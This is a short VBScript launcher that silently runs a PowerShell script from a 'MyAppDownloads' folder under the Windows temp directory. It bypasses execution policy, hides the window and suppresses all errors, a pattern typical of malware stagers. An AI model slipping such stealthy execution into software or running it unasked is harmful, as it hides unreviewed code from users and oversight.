' launcher.vbs
On Error Resume Next

Dim objShell, ps1, cmd
Set objShell = CreateObject("Wscript.Shell")

ps1 = """" & CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\MyAppDownloads\script.ps1" & """"
cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & ps1

objShell.Run cmd, 0, False
